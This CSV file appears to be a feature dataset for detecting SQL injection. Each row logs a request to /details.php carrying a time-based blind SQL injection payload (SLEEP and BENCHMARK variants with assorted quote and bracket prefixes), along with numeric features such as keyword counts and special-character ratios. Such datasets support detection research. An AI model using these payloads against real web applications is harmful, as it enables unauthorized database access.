full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%207664%3D7664%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2]-(SELECT 0 WHERE 7664=7664;(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.509237,10.0.2.31,3,69,220.4,2,7.246376811594203
/details.php?prod=5&type=2%27%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2');(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.521525,10.0.2.31,2,44,220.4,3,11.363636363636363
/details.php?prod=5&type=2%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2';(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.525273,10.0.2.31,2,43,220.4,3,11.627906976744185
/details.php?prod=5&type=2%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2"";(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.529041,10.0.2.31,2,43,220.4,3,11.627906976744185
/details.php?prod=5&type=2%27%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2'));(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.53429,10.0.2.31,2,45,220.4,3,11.11111111111111
/details.php?prod=5&type=2%27%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2')));(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.537655,10.0.2.31,2,46,220.4,3,10.869565217391305
/details.php?prod=5&type=2%25%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2%';(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.541339,10.0.2.31,2,44,220.4,3,11.363636363636363
/details.php?prod=5&type=2%22%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2"");(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.545005,10.0.2.31,2,44,220.4,3,11.363636363636363
/details.php?prod=5&type=2%22%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2""));(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.548721,10.0.2.31,2,45,220.4,3,11.11111111111111
/details.php?prod=5&type=2%22%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2"")));(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.552946,10.0.2.31,2,46,220.4,3,10.869565217391305
/details.php?prod=5&type=2%27%29%29%20AS%20Zlrb%20WHERE%208291%3D8291%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2')) AS Zlrb WHERE 8291=8291;(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.557532,10.0.2.31,4,69,220.4,3,10.144927536231885
/details.php?prod=5&type=2%22%29%29%20AS%20SObp%20WHERE%205240%3D5240%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2"")) AS SObp WHERE 5240=5240;(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.560627,10.0.2.31,4,69,220.4,3,10.144927536231885
/details.php?prod=5&type=2%27%29%20AS%20vrtm%20WHERE%209173%3D9173%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2') AS vrtm WHERE 9173=9173;(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.564372,10.0.2.31,4,68,220.4,3,10.294117647058824
/details.php?prod=5&type=2%22%29%20AS%20WKpB%20WHERE%205979%3D5979%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2"") AS WKpB WHERE 5979=5979;(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.568692,10.0.2.31,4,68,220.4,3,10.294117647058824
/details.php?prod=5&type=2%22%3D%222%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,"/details.php?prod=5&type=2""=""2"";(SELECT * FROM (SELECT(SLEEP(5)))ticM)#",1680093133.571773,10.0.2.31,2,47,220.4,3,10.638297872340425
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ticM%29%23,/details.php?prod=5&type=2' IN BOOLEAN MODE);(SELECT * FROM (SELECT(SLEEP(5)))ticM)#,1680093133.575575,10.0.2.31,3,60,220.4,3,10.0
/details.php?prod=5&type=2%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20KlgL,/details.php?prod=5&type=2);(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- KlgL,1680093133.57932,10.0.2.31,2,49,220.4,2,8.16326530612245
/details.php?prod=5&type=2%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%289220%3D9220,/details.php?prod=5&type=2);(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (9220=9220,1680093133.582826,10.0.2.31,3,57,220.4,1,7.017543859649122
/details.php?prod=5&type=2%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%287723%3D7723,/details.php?prod=5&type=2));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ((7723=7723,1680093133.586411,10.0.2.31,3,59,220.4,1,6.779661016949152
/details.php?prod=5&type=2%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%284764%3D4764,/details.php?prod=5&type=2)));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (((4764=4764,1680093133.59002,10.0.2.31,3,61,220.4,1,6.557377049180328
/details.php?prod=5&type=2%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29,/details.php?prod=5&type=2;(SELECT * FROM (SELECT(SLEEP(5)))ykNt),1680093133.594788,10.0.2.31,2,41,220.4,1,7.317073170731708
/details.php?prod=5&type=2%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20mymB,/details.php?prod=5&type=2;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- mymB,1680093133.598974,10.0.2.31,2,48,220.4,2,8.333333333333334
/details.php?prod=5&type=2%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%23%20lztc,/details.php?prod=5&type=2;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)# lztc,1680093133.607795,10.0.2.31,2,47,220.4,2,8.51063829787234
/details.php?prod=5&type=2%29%29%20AS%20yzPN%20WHERE%206974%3D6974%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20HFMX,/details.php?prod=5&type=2)) AS yzPN WHERE 6974=6974;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- HFMX,1680093133.616924,10.0.2.31,4,74,220.4,2,8.108108108108109
/details.php?prod=5&type=2%29%20AS%20qcBY%20WHERE%205542%3D5542%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20FenO,/details.php?prod=5&type=2) AS qcBY WHERE 5542=5542;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- FenO,1680093133.624209,10.0.2.31,4,73,220.4,2,8.219178082191782
/details.php?prod=5&type=2%60%20WHERE%208267%3D8267%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20ELYx,/details.php?prod=5&type=2` WHERE 8267=8267;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- ELYx,1680093133.628314,10.0.2.31,3,65,220.4,2,7.6923076923076925
/details.php?prod=5&type=2%60%29%20WHERE%203283%3D3283%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20scGM,/details.php?prod=5&type=2`) WHERE 3283=3283;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- scGM,1680093133.633375,10.0.2.31,3,66,220.4,2,7.575757575757576
/details.php?prod=5&type=2%60%3D%602%60%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%602%60%3D%602,/details.php?prod=5&type=2`=`2`;(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND `2`=`2,1680093133.637623,10.0.2.31,3,57,220.4,1,7.017543859649122
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%207450%3D7450%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%29%7C%5B2,/details.php?prod=5&type=2]-(SELECT 0 WHERE 7450=7450;(SELECT * FROM (SELECT(SLEEP(5)))ykNt))|[2,1680093133.64075,10.0.2.31,3,72,220.4,1,5.555555555555555
/details.php?prod=5&type=2%27%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20fnxR,/details.php?prod=5&type=2');(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- fnxR,1680093133.644344,10.0.2.31,2,50,220.4,3,10.0
/details.php?prod=5&type=2%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20lCAq,/details.php?prod=5&type=2';(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- lCAq,1680093133.648399,10.0.2.31,2,49,220.4,3,10.204081632653061
/details.php?prod=5&type=2%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20uUqY,"/details.php?prod=5&type=2"";(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- uUqY",1680093133.652004,10.0.2.31,2,49,220.4,3,10.204081632653061
/details.php?prod=5&type=2%27%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%27RsmR%27%3D%27RsmR,/details.php?prod=5&type=2');(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ('RsmR'='RsmR,1680093133.656143,10.0.2.31,3,61,220.4,2,8.19672131147541
/details.php?prod=5&type=2%27%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%27INxE%27%3D%27INxE,/details.php?prod=5&type=2'));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (('INxE'='INxE,1680093133.659341,10.0.2.31,4,63,220.4,2,9.523809523809524
/details.php?prod=5&type=2%27%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%28%27KWQS%27%3D%27KWQS,/details.php?prod=5&type=2')));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ((('KWQS'='KWQS,1680093133.66202,10.0.2.31,3,65,220.4,2,7.6923076923076925
/details.php?prod=5&type=2%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%27qxwe%27%3D%27qxwe,/details.php?prod=5&type=2';(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND 'qxwe'='qxwe,1680093133.666523,10.0.2.31,3,59,220.4,2,8.474576271186441
/details.php?prod=5&type=2%27%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%27kdRb%27%20LIKE%20%27kdRb,/details.php?prod=5&type=2');(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ('kdRb' LIKE 'kdRb,1680093133.670391,10.0.2.31,4,66,220.4,2,9.090909090909092
/details.php?prod=5&type=2%27%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%27fJkI%27%20LIKE%20%27fJkI,/details.php?prod=5&type=2'));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (('fJkI' LIKE 'fJkI,1680093133.67349,10.0.2.31,4,68,220.4,2,8.823529411764707
/details.php?prod=5&type=2%27%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%28%27saST%27%20LIKE%20%27saST,/details.php?prod=5&type=2')));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ((('saST' LIKE 'saST,1680093133.677008,10.0.2.31,4,70,220.4,2,8.571428571428571
/details.php?prod=5&type=2%25%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%27gepK%25%27%3D%27gepK,/details.php?prod=5&type=2%';(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND 'gepK%'='gepK,1680093133.680754,10.0.2.31,3,61,220.4,2,8.19672131147541
/details.php?prod=5&type=2%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%27Qnba%27%20LIKE%20%27Qnba,/details.php?prod=5&type=2';(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND 'Qnba' LIKE 'Qnba,1680093133.684753,10.0.2.31,4,64,220.4,2,9.375
/details.php?prod=5&type=2%22%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%22mIAa%22%3D%22mIAa,"/details.php?prod=5&type=2"");(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (""mIAa""=""mIAa",1680093133.690127,10.0.2.31,3,61,220.4,2,8.19672131147541
/details.php?prod=5&type=2%22%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%22XRZQ%22%3D%22XRZQ,"/details.php?prod=5&type=2""));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ((""XRZQ""=""XRZQ",1680093133.694032,10.0.2.31,3,63,220.4,2,7.936507936507937
/details.php?prod=5&type=2%22%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%28%22JKkV%22%3D%22JKkV,"/details.php?prod=5&type=2"")));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (((""JKkV""=""JKkV",1680093133.69838,10.0.2.31,3,65,220.4,2,7.6923076923076925
/details.php?prod=5&type=2%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%22xbpy%22%3D%22xbpy,"/details.php?prod=5&type=2"";(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ""xbpy""=""xbpy",1680093133.702457,10.0.2.31,3,59,220.4,2,8.474576271186441
/details.php?prod=5&type=2%22%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%22XQXh%22%20LIKE%20%22XQXh,"/details.php?prod=5&type=2"");(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (""XQXh"" LIKE ""XQXh",1680093133.705661,10.0.2.31,4,66,220.4,2,9.090909090909092
/details.php?prod=5&type=2%22%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%22OcIy%22%20LIKE%20%22OcIy,"/details.php?prod=5&type=2""));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ((""OcIy"" LIKE ""OcIy",1680093133.70944,10.0.2.31,4,68,220.4,2,8.823529411764707
/details.php?prod=5&type=2%22%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%28%28%28%22Tlnn%22%20LIKE%20%22Tlnn,"/details.php?prod=5&type=2"")));(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND (((""Tlnn"" LIKE ""Tlnn",1680093133.713147,10.0.2.31,4,70,220.4,2,8.571428571428571
/details.php?prod=5&type=2%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%22yfol%22%20LIKE%20%22yfol,"/details.php?prod=5&type=2"";(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ""yfol"" LIKE ""yfol",1680093133.717398,10.0.2.31,4,64,220.4,2,9.375
/details.php?prod=5&type=2%27%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20OR%20%27CeDF%27%3D%27vZKT,/details.php?prod=5&type=2';(SELECT * FROM (SELECT(SLEEP(5)))ykNt) OR 'CeDF'='vZKT,1680093133.720908,10.0.2.31,3,58,220.4,2,8.620689655172415
/details.php?prod=5&type=2%27%29%29%20AS%20qAnf%20WHERE%204711%3D4711%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20jCrs,/details.php?prod=5&type=2')) AS qAnf WHERE 4711=4711;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- jCrs,1680093133.724661,10.0.2.31,4,75,220.4,3,9.333333333333334
/details.php?prod=5&type=2%22%29%29%20AS%20BxiY%20WHERE%206399%3D6399%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20KkOb,"/details.php?prod=5&type=2"")) AS BxiY WHERE 6399=6399;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- KkOb",1680093133.7277,10.0.2.31,4,75,220.4,3,9.333333333333334
/details.php?prod=5&type=2%27%29%20AS%20WjSS%20WHERE%205959%3D5959%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20WeBn,/details.php?prod=5&type=2') AS WjSS WHERE 5959=5959;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- WeBn,1680093133.731707,10.0.2.31,4,74,220.4,3,9.45945945945946
/details.php?prod=5&type=2%22%29%20AS%20YpRr%20WHERE%203053%3D3053%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29--%20MqJe,"/details.php?prod=5&type=2"") AS YpRr WHERE 3053=3053;(SELECT * FROM (SELECT(SLEEP(5)))ykNt)-- MqJe",1680093133.736281,10.0.2.31,4,74,220.4,3,9.45945945945946
/details.php?prod=5&type=2%22%3D%222%22%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29ykNt%29%20AND%20%222%22%3D%222,"/details.php?prod=5&type=2""=""2"";(SELECT * FROM (SELECT(SLEEP(5)))ykNt) AND ""2""=""2",1680093133.739511,10.0.2.31,3,57,220.4,2,8.771929824561404
/details.php?prod=5&type=2%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2);SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.743747,10.0.2.31,1,46,220.4,2,6.521739130434782
/details.php?prod=5&type=2%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2));SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.748198,10.0.2.31,1,47,220.4,2,6.382978723404255
/details.php?prod=5&type=2%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2)));SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.75123,10.0.2.31,1,48,220.4,2,6.25
/details.php?prod=5&type=2%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.754928,10.0.2.31,1,45,220.4,2,6.666666666666667
/details.php?prod=5&type=2%29%29%20AS%20xKmI%20WHERE%201656%3D1656%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2)) AS xKmI WHERE 1656=1656;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.758898,10.0.2.31,3,71,220.4,2,7.042253521126761
/details.php?prod=5&type=2%29%20AS%20wvez%20WHERE%206450%3D6450%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2) AS wvez WHERE 6450=6450;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.762224,10.0.2.31,3,70,220.4,2,7.142857142857143
/details.php?prod=5&type=2%60%20WHERE%207069%3D7069%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2` WHERE 7069=7069;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.766173,10.0.2.31,2,62,220.4,2,6.451612903225806
/details.php?prod=5&type=2%60%29%20WHERE%209790%3D9790%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2`) WHERE 9790=9790;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.77287,10.0.2.31,2,63,220.4,2,6.349206349206349
/details.php?prod=5&type=2%60%3D%602%60%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2`=`2`;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.776706,10.0.2.31,1,50,220.4,2,6.0
/details.php?prod=5&type=2%5D-%28SELECT%200%20WHERE%207031%3D7031%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2]-(SELECT 0 WHERE 7031=7031;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.78777,10.0.2.31,2,72,220.4,2,5.555555555555555
/details.php?prod=5&type=2%27%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2');SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.792089,10.0.2.31,1,47,220.4,3,8.51063829787234
/details.php?prod=5&type=2%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2';SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.796053,10.0.2.31,1,46,220.4,3,8.695652173913043
/details.php?prod=5&type=2%22%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2"";SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.799986,10.0.2.31,1,46,220.4,3,8.695652173913043
/details.php?prod=5&type=2%27%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2'));SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.804089,10.0.2.31,1,48,220.4,3,8.333333333333334
/details.php?prod=5&type=2%27%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2')));SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.807667,10.0.2.31,1,49,220.4,3,8.16326530612245
/details.php?prod=5&type=2%25%27%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2%';SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.812249,10.0.2.31,1,47,220.4,3,8.51063829787234
/details.php?prod=5&type=2%22%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2"");SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.817537,10.0.2.31,1,47,220.4,3,8.51063829787234
/details.php?prod=5&type=2%22%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2""));SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.820823,10.0.2.31,1,48,220.4,3,8.333333333333334
/details.php?prod=5&type=2%22%29%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2"")));SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.824581,10.0.2.31,1,49,220.4,3,8.16326530612245
/details.php?prod=5&type=2%27%29%29%20AS%20XydO%20WHERE%209075%3D9075%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2')) AS XydO WHERE 9075=9075;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.829311,10.0.2.31,3,72,220.4,3,8.333333333333334
/details.php?prod=5&type=2%22%29%29%20AS%20ugyK%20WHERE%204339%3D4339%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2"")) AS ugyK WHERE 4339=4339;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.833498,10.0.2.31,3,72,220.4,3,8.333333333333334
/details.php?prod=5&type=2%27%29%20AS%20pbug%20WHERE%203191%3D3191%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2') AS pbug WHERE 3191=3191;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.837876,10.0.2.31,3,71,220.4,3,8.450704225352112
/details.php?prod=5&type=2%22%29%20AS%20qwWw%20WHERE%209479%3D9479%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2"") AS qwWw WHERE 9479=9479;SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.841919,10.0.2.31,3,71,220.4,3,8.450704225352112
/details.php?prod=5&type=2%22%3D%222%22%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2""=""2"";SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.845208,10.0.2.31,1,50,220.4,3,8.0
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48597541%29%29%23,"/details.php?prod=5&type=2' IN BOOLEAN MODE);SELECT BENCHMARK(5000000,MD5(0x48597541))#",1680093133.849662,10.0.2.31,2,63,220.4,3,7.936507936507937
/details.php?prod=5&type=2%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29--%20NtsN,"/details.php?prod=5&type=2);SELECT BENCHMARK(5000000,MD5(0x43774648))-- NtsN",1680093133.853715,10.0.2.31,1,52,220.4,2,5.769230769230769
/details.php?prod=5&type=2%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%289151%3D9151,"/details.php?prod=5&type=2);SELECT BENCHMARK(5000000,MD5(0x43774648)) AND (9151=9151",1680093133.856891,10.0.2.31,2,60,220.4,1,5.0
/details.php?prod=5&type=2%29%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x43774648%29%29%20AND%20%28%283809%3D3809,"/details.php?prod=5&type=2));SELECT BENCHMARK(5000000,MD5(0x43774648)) AND ((3809=3809",1680093133.860331,10.0.2.31,2,62,220.4,1,4.838709677419355
